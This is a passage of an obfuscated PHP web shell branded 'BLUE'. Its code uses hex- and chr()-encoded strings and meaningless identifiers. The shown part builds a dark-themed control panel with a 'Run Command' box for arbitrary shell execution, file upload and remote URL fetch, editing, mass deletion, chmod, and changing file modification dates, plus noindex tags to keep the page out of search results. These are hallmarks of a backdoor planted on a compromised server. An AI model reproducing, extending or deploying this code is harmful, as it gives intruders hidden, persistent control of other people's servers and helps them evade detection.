    $_097a3e = @opendir($_a7b8f0);
    if (!$_097a3e)
        return;
    while (false !== ($_90e0bb = readdir($_097a3e))) {
        if ($_90e0bb === "\x2e" || $_90e0bb === chr(46).chr(46))
            continue;
        $_6812dc = $_a7b8f0 . DIRECTORY_SEPARATOR . $_90e0bb;
        $_5b6f31 = $_b15708 . "\x2f" . basename($_90e0bb);
        if (is_dir($_6812dc))
            _fb0db2b7d($_112030, $_6812dc, $_5b6f31);
        elseif (is_file($_6812dc) && method_exists($_112030, "\x61\x64\x64\x46\x69\x6c\x65"))
            $_112030->addFile($_6812dc, $_5b6f31);
    }
    closedir($_097a3e);
}
function _fdfbd192c($_bbad95, $_a7b8f0, $_b15708)
{
    $_a7b8f0 = rtrim($_a7b8f0, DIRECTORY_SEPARATOR);
    $_097a3e = @opendir($_a7b8f0);
    if (!$_097a3e)
        return;
    while (false !== ($_90e0bb = readdir($_097a3e))) {
        if ($_90e0bb === chr(46) || $_90e0bb === "\x2e\x2e")
            continue;
        $_6812dc = $_a7b8f0 . DIRECTORY_SEPARATOR . $_90e0bb;
        $_5b6f31 = $_b15708 . chr(47) . basename($_90e0bb);
        if (is_dir($_6812dc)) {
            if (method_exists($_bbad95, "\x61\x64\x64\x45\x6d\x70\x74\x79\x44\x69\x72"))
                $_bbad95->addEmptyDir($_5b6f31);
            _fdfbd192c($_bbad95, $_6812dc, $_5b6f31);
        }
        elseif (is_file($_6812dc) && method_exists($_bbad95, chr(97).chr(100).chr(100).chr(70).chr(105).chr(108).chr(101))) {
            $_bbad95->addFile($_6812dc, $_5b6f31);
        }
    }
    closedir($_097a3e);
}


$_d2b3df = _f243e76e7($_7d57a6);
$_4c315a = array();
$_67843a = array();
foreach ($_d2b3df as $_3caea7) {
    $_6812dc = $_7d57a6 . DIRECTORY_SEPARATOR . $_3caea7;
    if (is_dir($_6812dc))
        $_67843a[] = $_3caea7;
    else
        $_4c315a[] = $_3caea7;
}
$_21a1fd = defined(chr(83).chr(79).chr(82).chr(84).chr(95).chr(78).chr(65).chr(84).chr(85).chr(82).chr(65).chr(76));
$_bed678 = defined(chr(83).chr(79).chr(82).chr(84).chr(95).chr(70).chr(76).chr(65).chr(71).chr(95).chr(67).chr(65).chr(83).chr(69));
if ($_21a1fd) {
    sort($_67843a, $_bed678 ? (SORT_NATURAL | SORT_FLAG_CASE) : SORT_NATURAL);
    sort($_4c315a, $_bed678 ? (SORT_NATURAL | SORT_FLAG_CASE) : SORT_NATURAL);
}
else {
    natcasesort($_67843a);
    $_67843a = array_values($_67843a);
    natcasesort($_4c315a);
    $_4c315a = array_values($_4c315a);
}

$_fbc78e = dirname($_7d57a6);
if ($_fbc78e === $_7d57a6)
    $_fbc78e = $_7d57a6;

$_dceac5 = ((((isset($_GET[chr(97)]) ? $_GET[chr(97)] : '') === "\x65\x64\x69\x74")) && isset($_GET[chr(102)])) ? _f9773869f($_7d57a6, $_GET[chr(102)]) : null;
$_70d700 = ($_dceac5 && is_file($_dceac5)) ? $_dceac5 : null;

$_962d29 = ((((isset($_GET[chr(97)]) ? $_GET["\x61"] : "") === chr(118).chr(105).chr(101).chr(119))) && isset($_GET["\x66"])) ? _f9773869f($_7d57a6, $_GET["\x66"]) : null;
$_b44f6c = ($_962d29 && is_file($_962d29)) ? $_962d29 : null;

$_3571b5 = isset($_GET["\x6d\x6f\x64\x65"]) ? $_GET[chr(109).chr(111).chr(100).chr(101)] : "\x61\x75\x74\x6f";
$_c17aa8 = in_array($_3571b5, array(chr(116).chr(120).chr(116), chr(98).chr(54).chr(52), "\x61\x75\x74\x6f"), true) ? $_3571b5 : "\x61\x75\x74\x6f";

$_9e5755 = isset($_SESSION["\x63\x73\x72\x66"]) ? $_SESSION[chr(99).chr(115).chr(114).chr(102)] : '';
$_c49b2c = date("\x59");
?>
    <!doctype html>
    <html lang="en" class="dark">
    <head>
        <meta charset="utf-8">
        <title>BLUE</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
        <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
        <script src="https://cdn.tailwindcss.com"></script>
        <script>
            tailwind.config = { darkMode:'class', theme:{ extend:{
                        fontFamily:{ ui:['Ubuntu','ui-sans-serif','system-ui','Segoe UI','Roboto','Helvetica Neue','Arial','Noto Sans'] },
                        colors:{ canvas:{DEFAULT:'#0b1220',light:'#0b1220',surface:'rgba(15,23,42,.8)'}, brand:{50:'#eef2ff',500:'#6366f1',600:'#5458ee',700:'#4338ca'} },
                        boxShadow:{ card:'0 10px 30px rgba(0,0,0,.35), inset 0 1px 0 rgba(255,255,255,.03)' , glow:'0 6px 20px rgba(99,102,241,.25)' },
                        borderRadius:{ xl2:'18px' }
                    } } }
        </script>
        <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap" rel="stylesheet">
        <link href="https://www.svgrepo.com/show/475654/github-color.svg" rel="icon">

        <!-- CodeMirror 5 -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/theme/material-darker.min.css">
        <style>
            .CodeMirror{ border:1px solid rgba(148,163,184,.18); border-radius:12px; height:420px; background:#0b1220; color:#e5e7eb; }
            .cm-s-material-darker .CodeMirror-gutters{ background:#0b1220; border-right:1px solid rgba(148,163,184,.18); }

            html,body{height:100%}
            body{font-family:'Ubuntu',system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial,"Noto Sans";}
            .shell{min-height:100vh;background:radial-gradient(1200px 600px at 20% -10%, rgba(99,102,241,.15), transparent 60%), radial-gradient(900px 500px at 90% 0%, rgba(168,85,247,.12), transparent 60%), #0b1220; display:grid; grid-template-rows:auto 1fr auto;}
            .card{background:rgba(15,23,42,.8);border:1px solid rgba(148,163,184,.15);border-radius:18px;box-shadow:0 10px 30px rgba(0,0,0,.35), inset 0 1px 0 rgba(255,255,255,.03);backdrop-filter:blur(8px);}
            .field{border:1px solid rgba(148,163,184,.18);border-radius:12px;padding:.5rem .75rem;width:100%;background:#0b1220;color:#e5e7eb;}
            .field:focus{outline:none;box-shadow:0 0 0 4px rgba(99,102,241,.25);border-color:#6366f1}
            .btn{background:linear-gradient(180deg,#6366f1,#4f46e5);color:#eef2ff;border-radius:10px;padding:.5rem .75rem;font-weight:700;font-size:.875rem;line-height:1.25rem;display:inline-flex;align-items:center;justify-content:center;transition:transform .05s, box-shadow .15s, filter .15s; box-shadow:0 6px 20px rgba(99,102,241,.22);}
            .btn:hover{filter:brightness(1.06);box-shadow:0 10px 26px rgba(99,102,241,.35)} .btn:active{transform:translateY(.5px)}
            .btn-ghost{background:transparent;border:1px solid rgba(148,163,184,.25);color:#e5e7eb;}
            .btn-xs{padding:.25rem .5rem;font-size:.75rem;border-radius:8px}.btn-sm{padding:.35rem .6rem;font-size:.8125rem;border-radius:9px}.btnw{min-width:96px}
            .tbl thead th{position:sticky;top:0;background:#0b1220e6;backdrop-filter:blur(6px);z-index:1;color:#cbd5e1}
            .tbl tbody tr:nth-child(even){background:rgba(148,163,184,.04)}
            .tbl tbody tr.hoverable:hover{background:rgba(99,102,241,.22);box-shadow:inset 0 0 0 9999px rgba(99,102,241,.10)}
            .tbl tbody tr.hoverable{transition:background .15s ease}
            .ico{width:18px;height:18px;display:inline-block;vertical-align:text-bottom;color:#cbd5e1}
            .mono{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace}
            .badge-small{font-size:11px;padding:.1rem .4rem;border-radius:999px;background:#111827;color:#c7d2fe;border:1px solid #374151}
            .row-actions{display:grid;grid-template-columns:repeat(8, minmax(90px, auto));gap:.35rem;justify-items:start}
            @media (max-width:1200px){ .row-actions{grid-template-columns:repeat(3, minmax(90px, auto));} }
            .tablewrap{height:calc(100vh - 320px);overflow:auto}
            @media (max-height:800px){ .tablewrap{height:calc(100vh - 360px)} }
            .drop-hint{border:2px dashed rgba(99,102,241,.45); background:rgba(99,102,241,.06)}
            .droptarget{outline:2px dashed rgba(99,102,241,.7); outline-offset:-2px}
            /*#tableCard{ min-height: calc(100vh - 260px); }*/

            /* Command editors */
            .cm-cmd-input { font-size:13px; line-height:1.45; }
            .cm-cmd-input .CodeMirror { width:100% !important; }
            .cm-cmd-input .CodeMirror-scroll { height:36px !important; } /* single line */
            .cm-cmd-input .CodeMirror { height:36px !important; }
            .cm-cmd-output { font-size:14px; line-height:1.5; }
            .cm-cmd-output .CodeMirror { width:100% !important; }
            .cm-cmd-output .CodeMirror-scroll { height:380px !important; }

            /* Lebar command dibatasi agar tidak terlalu panjang */
            .cmd-container{ max-width:600px; width:100%; }
            @media (min-width:1536px){ .cmd-container{ max-width:680px; } }

            /* Make table copy-friendly */
            #tableCard, #tableCard * { user-select: text; -webkit-user-select: text; }

            /* Force ALL links inside the directory table to be white */
            #dirTable a, #dirTable a:visited { color:#ffffff !important; }

            /* Footer gradient line */
            .footer-line{height:1px;background:linear-gradient(90deg,rgba(99,102,241,.0),rgba(99,102,241,.5),rgba(99,102,241,.0));}

            /* Placeholder abu untuk CodeMirror command */
            .cm-cmd-input .CodeMirror-empty .CodeMirror-placeholder {
                color:#94a3b8; /* slate-400 */
                opacity:.95;
            }
        </style>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/mode/loadmode.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/meta.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/edit/closebrackets.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/edit/matchbrackets.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/selection/active-line.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/display/placeholder.min.js"></script>
    </head>
    <body class="shell text-slate-100" id="bodyRoot">
    <header class="sticky top-0 z-20 w-full border-b border-slate-800 bg-slate-900/70 backdrop-blur">
        <div class="w-full px-6 py-3 flex items-center justify-between gap-3">
            <div class="flex items-center gap-3 shrink-0">
                <div class="text-2xl"><?php echo _f9c42d19e("\x70\x77\x78", chr(105).chr(99).chr(111)); ?></div>
                <div>
                    <div class="text-lg font-semibold tracking-tight" style="background:linear-gradient(90deg,#93c5fd,#c4b5fd);-webkit-background-clip:text;background-clip:text;color:transparent"><a href="?">BLUE</a></div>
                    <div class="text-xs text-slate-400">PHP <?php echo h(PHP_VERSION); ?></div>
                </div>
            </div>

            <div class="hidden md:flex items-center gap-2 rounded-xl border border-slate-700 bg-slate-900/60 px-2 py-1 shrink-0">
                <?php echo _f9c42d19e(chr(115).chr(101).chr(97).chr(114).chr(99).chr(104), "\x69\x63\x6f"); ?>
                <input id="searchBox" type="search" placeholder="Filter by name (Ctrl+/)" class="bg-transparent text-sm outline-none placeholder:text-slate-500 w-64" oninput="filterRows()">
            </div>

            <div class="text-sm text-slate-300 hidden lg:block truncate">
                Path: <span class="mono"><?php echo h($_7d57a6); ?></span>
            </div>

            <!-- Command (dibatasi lebar) -->
            <div class="cmd-container ml-auto">
                <form method="post" action="?a=cmd&p=<?php echo rawurlencode($_7d57a6); ?>" class="hidden md:flex items-center gap-2 w-full" id="cmdForm">
                    <input type="hidden" name="csrf" value="<?php echo h($_9e5755); ?>">
                    <textarea id="cmdTA" name="cmd" class="field mono w-full" placeholder="Run Command" rows="1"></textarea>
                    <button class="btn btn-sm shrink-0" type="submit">Run</button>
                </form>
            </div>

            <form method="post" action="?a=logout&p=<?php echo rawurlencode($_7d57a6); ?>" class="ml-1 shrink-0">
                <input type="hidden" name="csrf" value="<?php echo h($_9e5755); ?>">
                <button class="btn btn-sm" type="submit">Logout</button>
            </form>
        </div>
    </header>

    <main class="w-full px-6 py-4 grid grid-cols-12 gap-4">

        <?php if (!empty($_SESSION[chr(99).chr(109).chr(100).chr(95).chr(114).chr(101).chr(115).chr(117).chr(108).chr(116)])):
    $_e3c557 = $_SESSION["\x63\x6d\x64\x5f\x72\x65\x73\x75\x6c\x74"];
    unset($_SESSION["\x63\x6d\x64\x5f\x72\x65\x73\x75\x6c\x74"]); ?>
            <section class="col-span-12">
                <div class="card p-4 mb-4">
                    <details open>
                        <summary class="cursor-pointer font-medium">
                            Command Output × <span class="mono"><?php echo h($_e3c557["\x63\x6d\x64"]); ?></span>
                            <span class="ml-2 text-xs text-slate-400">via <?php echo h($_e3c557["\x6d\x65\x74\x68\x6f\x64"]); ?>, exit <?php echo h((string)$_e3c557[chr(99).chr(111).chr(100).chr(101)]); ?></span>
                        </summary>
                        <pre id="cmdOutPre" class="mt-3 p-3 bg-black/40 rounded-lg overflow-auto text-xs mono border border-slate-700" style="max-height: 480px;"><?php echo h($_e3c557["\x6f\x75\x74"]); ?></pre>
                    </details>
                </div>
            </section>
        <?php
endif; ?>

        <!-- SIDEBAR -->
        <aside class="col-span-12 xl:col-span-3 space-y-4">
            <?php if (!empty($_SESSION[chr(109).chr(115).chr(103)])): ?>
                <div class="rounded-xl border border-blue-900/60 bg-blue-900/20 text-blue-100 px-4 py-3">
                    <?php echo h($_SESSION["\x6d\x73\x67"]);
    unset($_SESSION["\x6d\x73\x67"]); ?>
                </div>
            <?php
endif; ?>

            <section class="card p-4">
                <h2 class="font-medium mb-3">Navigation</h2>
                <div class="mb-2 text-sm text-slate-300">Breadcrumbs</div>
                <div class="flex flex-wrap gap-1 text-sm">
                    <?php foreach (_fa10b6e50($_7d57a6) as $_5e4544 => $_446f58):
    list($_201cba, $_a1c28d) = $_446f58; ?>
                        <?php if ($_5e4544)
        echo chr(60).chr(115).chr(112).chr(97).chr(110).chr(32).chr(99).chr(108).chr(97).chr(115).chr(115).chr(61).chr(34).chr(116).chr(101).chr(120).chr(116).chr(45).chr(115).chr(108).chr(97).chr(116).chr(101).chr(45).chr(54).chr(48).chr(48).chr(34).chr(62).chr(47).chr(60).chr(47).chr(115).chr(112).chr(97).chr(110).chr(62); ?>
                        <a href="?p=<?php echo rawurlencode($_a1c28d); ?>" class="inline-flex items-center gap-1 px-2 py-1 rounded-md border border-slate-700 bg-slate-800 text-slate-200 hover:border-slate-500 hover:bg-slate-700 transition"><?php echo h($_201cba); ?></a>
                    <?php
endforeach; ?>
                </div>
                <hr class="my-4 border-slate-700">
                <form method="get" class="space-y-2">
                    <label class="text-sm text-slate-300">Change Path</label>
                    <input type="text" name="p" class="field mono" placeholder="/home/user" value="<?php echo h($_7d57a6); ?>">
                    <div class="flex gap-2">
                        <button class="btn btnw" type="submit">Go</button>
                        <a class="btn btnw" href="?">Go to CWD</a>
                    </div>
                </form>
            </section>

            <!-- CREATE: New File / New Folder -->
            <section class="card p-4">
                <h2 class="font-medium mb-3">Create</h2>

                <form method="post" action="?a=new-file&p=<?php echo rawurlencode($_7d57a6); ?>" class="space-y-2">
                    <input type="hidden" name="csrf" value="<?php echo h($_9e5755); ?>">
                    <label class="text-sm text-slate-300">New File</label>
                    <input type="text" name="name" class="field mono" placeholder="newfile.txt" required>
                    <textarea name="content" class="field mono" rows="2" placeholder="(Optional) initial content; jika kosong akan diisi timestamp otomatis"></textarea>
                    <button class="btn w-full" type="submit">Create File</button>
                    <div class="text-xs text-slate-400">Dibuat non-0 byte dengan beberapa fallback (lintas versi PHP).</div>
                </form>

                <hr class="my-3 border-slate-700">

                <form method="post" action="?a=new-dir&p=<?php echo rawurlencode($_7d57a6); ?>" class="space-y-2">
                    <input type="hidden" name="csrf" value="<?php echo h($_9e5755); ?>">
                    <label class="text-sm text-slate-300">New Folder</label>
                    <input type="text" name="name" class="field mono" placeholder="NewFolder" required>
                    <button class="btn w-full" type="submit">Create Folder</button>
                </form>
            </section>

            <section class="card p-4">
                <h2 class="font-medium mb-3">Upload</h2>
                <div class="grid grid-cols-1 gap-4">
                    <form method="post" enctype="multipart/form-data" action="?a=upload&p=<?php echo rawurlencode($_7d57a6); ?>" class="space-y-2">
                        <input type="hidden" name="csrf" value="<?php echo h($_9e5755); ?>">
                        <input type="file" name="files[]" multiple class="block text-sm file:mr-3 file:rounded-md file:border file:border-slate-700 file:px-3 file:py-1.5 file:bg-slate-800 file:text-slate-200">
                        <button class="btn w-full" type="submit">Upload Files</button>
                        <div class="text-xs text-slate-400">Fallback order: move × rename × copy × get+put × stream copy.</div>
                    </form>
                    <form method="post" action="?a=url-upload&p=<?php echo rawurlencode($_7d57a6); ?>" class="space-y-2">
                        <input type="hidden" name="csrf" value="<?php echo h($_9e5755); ?>">
                        <input type="url" name="url" class="field" placeholder="https://example.com/file.txt" required>
                        <input type="text" name="filename" class="field" placeholder="File name (optional)">
                        <button class="btn w-full" type="submit">Fetch from URL</button>
                        <div class="text-xs text-slate-400">Methods: cURL × copy(stream) × get+put × stream copy.</div>
                    </form>
                    <div class="text-xs text-slate-400">
                        Tip: You can also drag &amp; drop files anywhere on this page to upload.
                    </div>
                </div>
            </section>
        </aside>

        <!-- MAIN: Editor / Preview panels + Table -->
        <section class="col-span-12 xl:col-span-9 flex flex-col gap-4">

            <?php if ($_70d700): ?>
                <?php
    $_e108e6 = ($_c17aa8 === chr(97).chr(117).chr(116).chr(111));
    if ($_e108e6) {
        $_c17aa8 = _f7d677d38($_70d700) ? chr(116).chr(120).chr(116) : chr(98).chr(54).chr(52);
    }
    $_207889 = @file_get_contents($_70d700);
    if ($_207889 === false) {
        $_207889 = '';
    }
    $_a6a5ea = ($_c17aa8 === "\x62\x36\x34") ? base64_encode($_207889) : $_207889; ?>
                <div class="card p-4" id="editPanelWrap">
                    <details id="editPanel" open>
                        <summary class="cursor-pointer font-medium flex items-center justify-between">
                            <div class="flex items-center gap-2">
                                <span>Edit File</span>
                                <span class="text-xs text-slate-400">Size: <?php echo h(_f94defb97((int)@filesize($_70d700))); ?></span>
                            </div>
                            <div class="flex items-center gap-2">
                                <button type="button" class="btn btn-xs btn-ghost" onclick="document.getElementById('editPanel').open=false">Close</button>
                            </div>
                        </summary>

                        <div class="mt-3 text-xs text-slate-400 mono line-clamp-2"><?php echo h($_70d700); ?></div>

                        <div class="mt-2">
                            <a class="inline-block px-2 py-1 rounded-md border border-slate-700 text-xs <?php echo $_c17aa8 === chr(116).chr(120).chr(116) ? "\x62\x67\x2d\x69\x6e\x64\x69\x67\x6f\x2d\x36\x30\x30\x20\x74\x65\x78\x74\x2d\x77\x68\x69\x74\x65\x20\x62\x6f\x72\x64\x65\x72\x2d\x69\x6e\x64\x69\x67\x6f\x2d\x36\x30\x30" : "\x62\x67\x2d\x73\x6c\x61\x74\x65\x2d\x38\x30\x30"; ?>" href="?a=edit&f=<?php echo rawurlencode(basename($_70d700)); ?>&p=<?php echo rawurlencode($_7d57a6); ?>&mode=txt">Text</a>
                            <a class="inline-block px-2 py-1 rounded-md border border-slate-700 text-xs <?php echo $_c17aa8 === chr(98).chr(54).chr(52) ? chr(98).chr(103).chr(45).chr(105).chr(110).chr(100).chr(105).chr(103).chr(111).chr(45).chr(54).chr(48).chr(48).chr(32).chr(116).chr(101).chr(120).chr(116).chr(45).chr(119).chr(104).chr(105).chr(116).chr(101).chr(32).chr(98).chr(111).chr(114).chr(100).chr(101).chr(114).chr(45).chr(105).chr(110).chr(100).chr(105).chr(103).chr(111).chr(45).chr(54).chr(48).chr(48) : "\x62\x67\x2d\x73\x6c\x61\x74\x65\x2d\x38\x30\x30"; ?>" href="?a=edit&f=<?php echo rawurlencode(basename($_70d700)); ?>&p=<?php echo rawurlencode($_7d57a6); ?>&mode=b64">Base64</a>
                        </div>

                        <form method="post" accept-charset="UTF-8" action="?a=edit-save&p=<?php echo rawurlencode($_7d57a6); ?>" class="mt-3" id="editForm">
                            <input type="hidden" name="csrf" value="<?php echo h($_9e5755); ?>">
                            <input type="hidden" name="file" value="<?php echo h(basename($_70d700)); ?>">
                            <input type="hidden" name="mode" value="<?php echo h($_c17aa8); ?>">

                            <?php if ($_c17aa8 === "\x74\x78\x74"): ?>
                                <textarea id="editor" name="content"><?php echo h($_a6a5ea); ?></textarea>
                            <?php
    else: ?>
                                <textarea name="content" class="w-full h-72 border border-slate-700 rounded-xl p-3 mono bg-slate-900 text-slate-100" spellcheck="false"><?php echo h($_a6a5ea); ?></textarea>
                                <div class="mt-2 text-xs text-slate-400">Base64 mode: content will be decoded on save.</div>
                            <?php
    endif; ?>

                            <div class="mt-3 flex flex-wrap gap-2 items-center">
                                <button class="btn btnw" type="submit">Save</button>
                                <button class="btn btnw btn-ghost" type="button" onclick="document.getElementById('editPanel').open=false">Close</button>
                                <a class="btn btnw" href="?p=<?php echo rawurlencode($_7d57a6); ?>">Exit & Reset</a>
                                <?php if ($_c17aa8 === chr(116).chr(120).chr(116)): ?>
                                    <span class="text-xs text-slate-400">Text mode: syntax highlighting auto-detects file type.</span>
                                <?php
    endif; ?>
                            </div>
                        </form>
                    </details>
                </div>
            <?php
endif; ?>

            <?php if ($_b44f6c): ?>
                <?php
    $_aac52d = (int)@filesize($_b44f6c);
    $_c26385 = strtolower(pathinfo($_b44f6c, PATHINFO_EXTENSION));
    $_d839ae = in_array($_c26385, array(chr(106).chr(112).chr(103), chr(106).chr(112).chr(101).chr(103), chr(112).chr(110).chr(103), "\x67\x69\x66", chr(119).chr(101).chr(98).chr(112), chr(98).chr(109).chr(112), chr(115).chr(118).chr(103)));
    $_024933 = _f7d677d38($_b44f6c);
    $_37dafe = 512 * 1024; 
    $_97e513 = "";
    if ($_024933) {
        $_97e513 = @file_get_contents($_b44f6c, false, null, 0, $_37dafe);
        if ($_97e513 === false)
            $_97e513 = '';
    }
?>
                <div class="card p-4" id="previewWrap">
                    <details id="previewPanel" open>
                        <summary class="cursor-pointer font-medium flex items-center justify-between">
                            <div class="flex items-center gap-2">
                                <span>Preview: <span class="mono"><?php echo h(basename($_b44f6c)); ?></span></span>
                                <span class="text-xs text-slate-400">Size: <?php echo h(_f94defb97($_aac52d)); ?></span>
                            </div>
                            <div class="flex items-center gap-2">
                                <button type="button" class="btn btn-xs btn-ghost" onclick="document.getElementById('previewPanel').open=false">Close</button>
                            </div>
                        </summary>

                        <div class="mt-3 text-xs text-slate-400 mono"><?php echo h($_b44f6c); ?></div>

                        <div class="mt-3">
                            <?php if ($_d839ae): ?>
                                <img src="?a=raw&f=<?php echo rawurlencode(basename($_b44f6c)); ?>&p=<?php echo rawurlencode($_7d57a6); ?>" alt="preview image" class="max-w-full rounded-lg border border-slate-700" style="max-height:480px;object-fit:contain;">
                            <?php
    elseif ($_024933): ?>
                                <pre id="previewPre" class="p-3 bg-black/40 rounded-lg overflow-auto text-sm mono border border-slate-700" style="max-height:480px;"><?php echo h($_97e513); ?></pre>
                                <?php if ($_aac52d > $_37dafe): ?>
                                    <div class="mt-2 text-xs text-slate-400">Showing <?php echo h(_f94defb97($_37dafe)); ?> of <?php echo h(_f94defb97($_aac52d)); ?>. Use Edit/Download for full content.</div>
                                <?php
        endif; ?>
                            <?php
    else: ?>
                                <div class="rounded-lg border border-slate-700 p-3 bg-slate-900/50">
                                    <div class="text-sm">This file type cannot be previewed directly.</div>
                                    <div class="mt-2 flex gap-2">
                                        <a class="btn btn-sm btnw" href="?a=download&f=<?php echo rawurlencode(basename($_b44f6c)); ?>&p=<?php echo rawurlencode($_7d57a6); ?>">Download</a>
                                        <a class="btn btn-sm btnw" href="?a=edit&f=<?php echo rawurlencode(basename($_b44f6c)); ?>&p=<?php echo rawurlencode($_7d57a6); ?>">Edit (careful if binary)</a>
                                    </div>
                                </div>
                            <?php
    endif; ?>
                        </div>
                    </details>
                </div>
            <?php
endif; ?>

            <div class="card p-4 flex flex-col" id="tableCard">
                <div class="flex items-center justify-between mb-3">
                    <h2 class="font-medium">Directory Contents</h2>
                    <div class="text-sm text-slate-400">Dirs: <?php echo count($_67843a); ?> × Files: <?php echo count($_4c315a); ?></div>
                </div>
                <div class="flex-1 flex flex-col">
                    <form method="post" action="?a=mass-delete&p=<?php echo rawurlencode($_7d57a6); ?>" id="bulkDeleteForm">
                        <input type="hidden" name="csrf" value="<?php echo h($_9e5755); ?>">
                    </form>
                    <div class="mb-3 flex flex-wrap gap-2">
                        <button form="bulkDeleteForm" class="btn btn-sm btnw" type="submit" onclick="return confirm('Delete all selected items?')">Delete Selected</button>

                        <form method="post" action="?a=mass-chmod&p=<?php echo rawurlencode($_7d57a6); ?>" class="inline-flex flex-wrap items-center gap-2" onsubmit="return prepBulkChmod(this)">
                            <input type="hidden" name="csrf" value="<?php echo h($_9e5755); ?>">
                            <input type="text" name="mode" class="field w-24 mono" placeholder="0644">
                            <label class="text-xs flex items-center gap-1 text-slate-300"><input type="checkbox" name="recursive"> rec</label>
                            <button class="btn btn-sm btnw" type="submit">Chmod Selected</button>
                        </form>

                        <button class="btn btn-sm btnw btn-ghost" type="button" onclick="selectAll(true)">Select All</button>
                        <button class="btn btn-sm btnw btn-ghost" type="button" onclick="selectAll(false)">Select None</button>

                        <div class="hidden md:flex items-center gap-2 ml-auto text-xs text-slate-400">
                            <span>Sort:</span>
                            <button type="button" class="btn btn-xs btn-ghost" onclick="sortBy('name')">Name</button>
                            <button type="button" class="btn btn-xs btn-ghost" onclick="sortBy('size')">Size</button>
                            <button type="button" class="btn btn-xs btn-ghost" onclick="sortBy('mtime')">Modified</button>
                        </div>

                        <!-- Toggle drag-to-move (default OFF) -->
                        <label class="flex items-center gap-2 text-xs text-slate-300 ml-2">
                            <input id="dragToggle" type="checkbox" class="accent-indigo-500">
                            Enable drag-to-move
                        </label>
                    </div>

                    <div class="tablewrap overflow-x-auto rounded-xl border border-slate-700 flex-1" id="dropZone">
                        <table id="dirTable" class="tbl min-w-full text-sm">
                            <thead class="text-left border-b border-slate-700">
                            <tr>
                                <th class="py-2 px-2 w-10"><input type="checkbox" id="chkAll" onclick="toggleAll(this)"></th>
                                <th class="py-2 px-2">Name</th>
                                <th class="py-2 px-2">Size</th>
                                <th class="py-2 px-2">Perms</th>
                                <th class="py-2 px-2">Owner</th>
                                <th class="py-2 px-2">Modified</th>
                                <th class="py-2 px-2">Actions</th>
                            </tr>
                            </thead>
                            <tbody id="dirBody">
                            <?php foreach ($_67843a as $_201cba):
    $_6812dc = $_7d57a6 . DIRECTORY_SEPARATOR . $_201cba;
    $_1121de = @is_readable($_6812dc);
    $_0980b5 = @is_writable($_6812dc);
    $_18e9b9 = $_0980b5 ? chr(116).chr(101).chr(120).chr(116).chr(45).chr(108).chr(105).chr(109).chr(101).chr(45).chr(52).chr(48).chr(48) : ($_1121de ? "\x74\x65\x78\x74\x2d\x77\x68\x69\x74\x65" : "\x74\x65\x78\x74\x2d\x72\x65\x64\x2d\x34\x30\x30");
?>
                                <tr class="border-b border-slate-800 hoverable"
                                    data-type="dir"
                                    data-name="<?php echo h(strtolower($_201cba)); ?>"
                                    data-size="0"
                                    data-mtime="<?php echo (int)@filemtime($_6812dc); ?>"
                                    draggable="true"
                                    ondragstart="onDragStartItem(event, <?php echo je($_201cba); ?>)"
                                    ondragover="onDragOverDir(event)"
                                    ondragleave="onDragLeaveDir(event)"
                                    ondrop="onDropToDir(event, <?php echo je($_201cba); ?>)">
                                    <td class="py-2 px-2"><input form="bulkDeleteForm" class="rowchk" type="checkbox" name="items[]" value="<?php echo h($_201cba); ?>"></td>
                                    <td class="py-2 px-2">
                                        <div class="flex items-center gap-2 <?php echo $_18e9b9; ?>">
                                            <?php echo _f4cf4de7c($_6812dc); ?>
                                            <a class="hover:underline font-medium text-white"
                                               draggable="false"
                                               onclick="return guardLinkCopy(event)"
                                               href="?p=<?php echo rawurlencode($_6812dc); ?>"><?php echo h($_201cba); ?></a>
                                            <span class="badge-small">DIR</span>
                                        </div>
                                    </td>
                                    <td class="py-2 px-2">-</td>
                                    <td class="py-2 px-2 mono <?php echo $_18e9b9; ?>"><?php echo h(_fe2009ff5($_6812dc)); ?></td>
                                    <td class="py-2 px-2"><?php echo h(_ff319afc5($_6812dc)); ?></td>
                                    <td class="py-2 px-2"><?php echo h(date(chr(89).chr(45).chr(109).chr(45).chr(100).chr(32).chr(72).chr(58).chr(105).chr(58).chr(115), @filemtime($_6812dc) ?: time())); ?></td>
                                    <td class="py-2 px-2">
                                        <div class="row-actions">
                                            <span class="btn btn-xs btnw" style="opacity:.35; pointer-events:none;">Edit</span>
                                            <span class="btn btn-xs btnw" style="opacity:.35; pointer-events:none;">Download</span>

                                            <button type="button" class="btn btn-xs btnw" onclick="toggleRow('rn-<?php echo h($_201cba); ?>')">Rename</button>
                                            <button type="button" class="btn btn-xs btnw" onclick="toggleRow('cm-<?php echo h($_201cba); ?>')">Chmod</button>
                                            <button type="button" class="btn btn-xs btnw" onclick="toggleRow('mt-<?php echo h($_201cba); ?>')">Change Date</button>

                                            <form method="post" action="?a=delete&p=<?php echo rawurlencode($_7d57a6); ?>" onsubmit="return confirm('Delete this directory (recursive)?')" class="inline">
                                                <input type="hidden" name="csrf" value="<?php echo h($_9e5755); ?>">
                                                <input type="hidden" name="target" value="<?php echo h($_201cba); ?>">
                                                <button class="btn btn-xs btnw" type="submit">Delete</button>
                                            </form>
                                        </div>

                                        <div id="rn-<?php echo h($_201cba); ?>" class="hidden mt-2">
                                            <form method="post" action="?a=rename&p=<?php echo rawurlencode($_7d57a6); ?>" class="flex flex-wrap gap-2">
                                                <input type="hidden" name="csrf" value="<?php echo h($_9e5755); ?>">
